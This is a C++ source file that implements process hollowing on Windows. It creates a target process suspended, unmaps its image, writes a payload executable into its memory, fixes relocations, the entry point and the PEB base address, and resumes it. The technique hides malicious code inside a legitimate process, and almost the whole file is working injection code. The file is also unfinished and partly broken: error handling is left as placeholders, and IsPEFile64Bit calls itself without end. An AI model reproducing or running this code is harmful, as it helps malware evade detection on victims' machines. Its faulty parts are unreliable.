#define _WIN32_WINNT 0x0600 // Defined for using functions that were
                            // introduced in Windows Vista / Server 2008
#include "ProcessHollowing.hpp"
#include "NtdllFunctions.hpp"
#include <iostream> // Delete!

ProcessHollowing::ProcessHollowing(const std::string& targetPath, const std::string& payloadPath) :
    _targetFilePath(targetPath), _payloadFilePath(payloadPath), _targetProcessInformation(CreateSuspendedTargetProcess()),
    _payloadBuffer(ReadFileContents(payloadPath, _payloadBufferSize)),
    _isTarget64Bit(IsProcess64Bit(_targetProcessInformation.hProcess)), _isPayload64Bit(IsPEFile64Bit(_payloadBuffer))
{
    if (!AreProcessesCompatible())
    {
        std::cout << "The processes are not compatible!" << std::endl;
        // Exception
    }
}

void ProcessHollowing::hollow()
{
    std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl;

    PEB targetPEB = ReadProcessPEB(_targetProcessInformation.hProcess);

    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));

    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, targetPEB.ImageBaseAddress))
    {
        std::cout << "206" << std::endl;
        // Exception
    }
    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, nullptr,
        payloadNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(nullptr == targetNewBaseAddress)
    {
        std::cout << "202 Error Code: " << GetLastError() << std::endl;
    }

    WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);

    UpdateTargetProcessEntryPoint((ULONGLONG)((LPBYTE)targetNewBaseAddress + payloadNTHeaders.OptionalHeader.AddressOfEntryPoint));

    ULONGLONG delta = (ULONGLONG)targetNewBaseAddress - payloadNTHeaders.OptionalHeader.ImageBase;
    if(0 != delta)
    {
        RelocateTargetProcess(delta, targetNewBaseAddress);
        
        UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
    }


    std::cout << "Resuming the target's main thread" << std::endl;
    
    NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);

    delete[] _payloadBuffer;
}

PROCESS_INFORMATION ProcessHollowing::CreateSuspendedTargetProcess()
{
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInformation;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ZeroMemory(&processInformation, sizeof(processInformation));

    if (0 == CreateProcessA(nullptr, (LPSTR)_targetFilePath.c_str(),
        nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInfo,
        &processInformation))
    {
        std::cout << "Could not open the target file!" << std::endl;
        // Exception
    }

    return processInformation;
}

PEB ProcessHollowing::ReadProcessPEB(HANDLE process)
{
    PROCESS_BASIC_INFORMATION targetBasicInformation;
    DWORD returnLength = 0;
    NtdllFunctions::_NtQueryInformationProcess(process, ProcessBasicInformation,
        &targetBasicInformation, sizeof(targetBasicInformation), &returnLength);
    
    PEB processPEB;
    if (0 == ReadProcessMemory(process, targetBasicInformation.PebBaseAddress, &processPEB, sizeof(processPEB),
        nullptr))
    {
        std::cout << "186" << std::endl;
        // Exception
    }

    return processPEB;
}

PBYTE ProcessHollowing::ReadFileContents(const std::string& filePath, DWORD& readBytesAmount)
{
    HANDLE fileHandle = CreateFileA(filePath.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, nullptr);
    if (INVALID_HANDLE_VALUE == fileHandle)
    {
        std::cout << "194" << std::endl;
        // Exception
    }

    DWORD fileSize = GetFileSize(fileHandle, nullptr);
    PBYTE fileContents = new BYTE[fileSize];
    ReadFile(fileHandle, fileContents, fileSize, &readBytesAmount, nullptr);

    if (0 == CloseHandle(fileHandle))
    {
        std::cout << "115" << std::endl;
    }
    
    return fileContents;
}

void ProcessHollowing::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
{
    IMAGE_DOS_HEADER sourceDOSHeader = *((PIMAGE_DOS_HEADER)sourceFileContents);
    IMAGE_NT_HEADERS sourceNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew));

    std::cout << "Delta: " << (ULONGLONG)targetBaseAddress - sourceNTHeaders.OptionalHeader.ImageBase << std::endl;

    sourceNTHeaders.OptionalHeader.ImageBase = (ULONGLONG)targetBaseAddress;

    CopyMemory((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew, &sourceNTHeaders, sizeof(sourceNTHeaders));
    
    std::cout << "Writing headers" << std::endl;
    DWORD oldProtection = 0;
    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes))
    {
        std::cout << "213" << std::endl;
    }
    if(0 == writtenBytes)
    {
        std::cout << "130" << std::endl;
    }
    VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
        PAGE_READONLY, &oldProtection);

    for (int i = 0; i < sourceNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)((LPBYTE)sourceFileContents + sourceDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        printf("Writing %s\n", currentSection->Name);
        NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (PVOID)((LPBYTE)targetBaseAddress +
            currentSection->VirtualAddress), (PVOID)((LPBYTE)sourceFileContents + currentSection->PointerToRawData),
            currentSection->SizeOfRawData, nullptr);

        VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
        SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
    }
}

void ProcessHollowing::UpdateTargetProcessEntryPoint(ULONGLONG newEntryPointAddress)
{
    if (_isTarget64Bit)
    {
        CONTEXT threadContext;
        threadContext.ContextFlags = CONTEXT_ALL;

        if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            std::cout << "169" << std::endl;
            // Exception
        }

        threadContext.Rcx = newEntryPointAddress;

        SetThreadContext(_targetProcessInformation.hThread, &threadContext);
    }
    else
    {
        WOW64_CONTEXT threadContext;
        threadContext.ContextFlags = WOW64_CONTEXT_ALL;

        if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            std::cout << "184" << std::endl;
            // Exception
        }

        threadContext.Eax = (DWORD)newEntryPointAddress;

        Wow64SetThreadContext(_targetProcessInformation.hThread, &threadContext);
    }
}

PIMAGE_SECTION_HEADER ProcessHollowing::FindTargetProcessSection(const std::string& sectionName)
{
    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
    BYTE maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                    // be as long as the size of the buffer, which means
                                                                    // it won't always have a terminating null byte, so
                                                                    // we include one by ourselves.
    int i = 0;

    for (i = 0; i < payloadNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
        {
            strncpy((char*)maxNameLengthHolder, (char*)currentSectionHeader->Name, IMAGE_SIZEOF_SHORT_NAME);
        }
        else
        {
            int nameLength = strlen((char*)currentSectionHeader->Name);
            strncpy((char*)maxNameLengthHolder, (char*)currentSectionHeader->Name, nameLength);
            maxNameLengthHolder[nameLength] = 0;
        }

        if (0 == strcmp(sectionName.c_str(), (char*)maxNameLengthHolder))
        {
            return currentSectionHeader;
        }
    }

    return nullptr;
    // Exception
}

void ProcessHollowing::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
{
    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS payloadNTHeaders = *((PIMAGE_NT_HEADERS)((LPBYTE)_payloadBuffer + payloadDOSHeader.e_lfanew));
    IMAGE_DATA_DIRECTORY relocData = payloadNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD dwOffset = 0;
    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(".reloc");
    DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;
    printf("249 Header name: %s\n", relocSectionHeader->Name);

    while (dwOffset < relocData.Size)
        {
            PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&_payloadBuffer[dwRelocAddr + dwOffset];

            dwOffset += sizeof(BASE_RELOCATION_BLOCK);

            DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);

            PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&_payloadBuffer[dwRelocAddr + dwOffset];

            for (DWORD i = 0; i < dwEntryCount; i++)
            {
                dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (0 != pBlocks[i].Type)
                {
                    DWORD dwFieldAddress = pBlockHeader->PageAddress + pBlocks[i].Offset;

                    ULONGLONG dwBuffer = 0;
                    ReadProcessMemory(_targetProcessInformation.hProcess, (PVOID)((ULONGLONG)processBaseAddress + dwFieldAddress),
                        &dwBuffer, sizeof(dwBuffer), nullptr);
                    
                    dwBuffer += baseAddressesDelta;

                    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)((ULONGLONG)processBaseAddress + dwFieldAddress), &dwBuffer, sizeof(dwBuffer), nullptr))
                    {
                        std::cout << "265 Error Code: " << GetLastError() << std::endl;
                    }
                }
            }
        }
}

void ProcessHollowing::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
{
    PROCESS_BASIC_INFORMATION targetBasicInformation;
    DWORD returnLength = 0;
    NtdllFunctions::_NtQueryInformationProcess(_targetProcessInformation.hProcess, ProcessBasicInformation,
        &targetBasicInformation, sizeof(targetBasicInformation), &returnLength);

    LPVOID pebImageBaseFieldAddress = (LPVOID)((LPBYTE)(targetBasicInformation.PebBaseAddress) + (sizeof(ULONGLONG) * 2));
    const size_t imageBaseSize = sizeof(ULONGLONG);

    SIZE_T written = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, pebImageBaseFieldAddress, &processNewBaseAddress, imageBaseSize, &written))
    {
        std::cout << "221" << std::endl;
    }
}

DWORD ProcessHollowing::SectionCharacteristicsToMemoryProtections(DWORD characteristics)
{
    if (characteristics & IMAGE_SCN_MEM_EXECUTE && characteristics & IMAGE_SCN_MEM_READ && characteristics & IMAGE_SCN_MEM_WRITE)
    {
        return PAGE_EXECUTE_READWRITE;
    }
    else if (characteristics & IMAGE_SCN_MEM_EXECUTE && characteristics & IMAGE_SCN_MEM_READ)
    {
        return PAGE_EXECUTE_READ;
    }
    else if (characteristics & IMAGE_SCN_MEM_READ && characteristics & IMAGE_SCN_MEM_WRITE)
    {
        return PAGE_READWRITE;
    }
    else if (characteristics & IMAGE_SCN_MEM_READ)
    {
        return PAGE_READONLY;
    }

    std::cout << "313 Should not happen!" << std::endl;
    return 0;
}

ULONG ProcessHollowing::GetProcessSubsystem(HANDLE process)
{
    PEB processPEB = ReadProcessPEB(process);
    
    return processPEB.ImageSubSystem;
}

WORD ProcessHollowing::GetPEFileSubsystem(const PBYTE fileBuffer)
{
    IMAGE_DOS_HEADER dosHeader = *((PIMAGE_DOS_HEADER)fileBuffer);

    if (IsPEFile64Bit(fileBuffer))
    {
        IMAGE_NT_HEADERS64 ntHeaders = *((PIMAGE_NT_HEADERS64)((LPBYTE)fileBuffer + dosHeader.e_lfanew));
        
        return ntHeaders.OptionalHeader.Subsystem;
    }

    IMAGE_NT_HEADERS32 ntHeaders = *((PIMAGE_NT_HEADERS32)((LPBYTE)fileBuffer + dosHeader.e_lfanew));

    return ntHeaders.OptionalHeader.Subsystem;
}

bool ProcessHollowing::IsProcess64Bit(const HANDLE processHandle)
{
    BOOL runningUnderWOW64 = FALSE;

    if (0 == IsWow64Process(processHandle, &runningUnderWOW64))
    {
        std::cout << "324 Error code: " << GetLastError() << std::endl;
        // Exception
    }

    if (runningUnderWOW64)
    {
        return false;
    }

    return IsWindows64Bit();
}

bool ProcessHollowing::AreProcessesCompatible()
{
    WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);

    return (_isTarget64Bit == _isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
}

bool ProcessHollowing::IsWindows64Bit()
{
#ifdef _WIN64
    return true;
#else
    BOOL runningUnderWOW64 = FALSE;

    if (0 ==IsWow64Process(GetCurrentProcess(), &runningUnderWOW64))
    {
        std::cout << "344" << std::endl;
        // Exception
    }

    return TRUE == runningUnderWOW64;
#endif
}

bool ProcessHollowing::IsPEFile64Bit(const PBYTE fileBuffer)
{
    IMAGE_DOS_HEADER dosHeader = *((PIMAGE_DOS_HEADER)fileBuffer);

    if (IsPEFile64Bit(fileBuffer))
    {
        IMAGE_NT_HEADERS64 ntHeaders = *((PIMAGE_NT_HEADERS64)((LPBYTE)fileBuffer + dosHeader.e_lfanew));

        return IMAGE_FILE_MACHINE_AMD64 == ntHeaders.FileHeader.Machine;
    }

    IMAGE_NT_HEADERS32 ntHeaders = *((PIMAGE_NT_HEADERS32)((LPBYTE)fileBuffer + dosHeader.e_lfanew));

    return IMAGE_FILE_MACHINE_AMD64 == ntHeaders.FileHeader.Machine;
}